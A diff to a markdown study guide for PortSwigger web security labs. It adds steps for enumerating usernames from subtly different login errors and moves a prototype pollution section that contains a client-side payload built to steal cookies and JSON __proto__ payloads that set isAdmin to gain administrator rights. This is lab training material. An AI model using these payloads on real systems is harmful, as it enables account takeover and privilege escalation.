@@ -823,6 +823,16 @@ X-Forwarded-For: 12.13.14.15
 
 [PortSwigger Lab: Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)  
   
+### Subtly Invalid Login  
+
+>***Identify*** that the login page is not protected by brute force attack, and no IP block or timeout enforced for invalid username or passsword.  
+
+![Subtly invalid login](images/subtly-invalid-login.png)  
+
+>Notice on the Intruder attack grep column for ```Invalid username or password.``` on response message for failed username attack do not contain full stop period at end. Repeat the attack with this identified username, and sniper attack the password field to ***identify*** 302 response for valid login.  
+
+[PortSwigger Lab: Username enumeration via subtly different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)  
+  
 # Privilege Escalation  
   
 ## PrivEsc JSON RoleId  
@@ -1204,7 +1214,45 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 ![jwt](images/jwt.png)  
 
 [PortSwigger Lab: JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)  
+  
+## ProtoType Pollution  
 
+>A target is vulnerable to DOM XSS via client side prototype pollution. **[DOM Invader](#dom-invader)** will identify the gadget and using hosted payload to phish a victim and steal their cookie.  
+
+>Exploit server Body section, host an exploit that will navigate the victim to a malicious URL.  
+
+```html
+<script>
+    location="https://TARGET.web.net/#__proto__[hitCallback]=alert%28document.cookie%29"
+</script>  
+```  
+
+[PortSwigger Lab: Client-side prototype pollution in third-party libraries](https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)
+
+![Proto pollution](images/proto-pollution.png)  
+
+### __Proto__ Privilege Escalation  
+
+>To identify Proto pollution, insert the follow into a JSON post request updating user profile information.  
+
+```JSON
+"__proto__": {
+    "foo":"bar"
+}
+```  
+
+![identify __proto__](images/identify__proto__.png)  
+  
+>Observe the ```isAdmin``` property and resend the POST update account with the __proto__ payload below to elevate our access role to Administrator.  
+
+```JSON
+"__proto__": {
+    "isAdmin":true
+}
+```  
+
+[PortSwigger Lab: Privilege escalation via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution)  
+  
 # Data Exfiltration  
 
 ## XXE Injections
@@ -1683,24 +1731,6 @@ wrtz{{#with "s" as |string|}}
 [PortSwigger Research SSTI](https://portswigger.net/research/server-side-template-injection)  
 
 >Note: ***Identify*** the Update forgot email template message under the admin_panel at the path /update_forgot_email.  
-  
-## ProtoType Pollution  
-
->A target is vulnerable to DOM XSS via client side prototype pollution. **[DOM Invader](#dom-invader)** will identify the gadget and using hosted payload to phish a victim and steal their cookie.  
-
->Exploit server Body section, host an exploit that will navigate the victim to a malicious URL.  
-
-```html
-<script>
-    location="https://TARGET.web.net/#__proto__[hitCallback]=alert%28document.cookie%29"
-</script>  
-```  
-
-[PortSwigger Lab: Client-side prototype pollution in third-party libraries](https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)
-
-![Proto pollution](images/proto-pollution.png)  
-
->Proto pollution section is incomplete ...need more input...  
   
 ## File Path Traversal
 
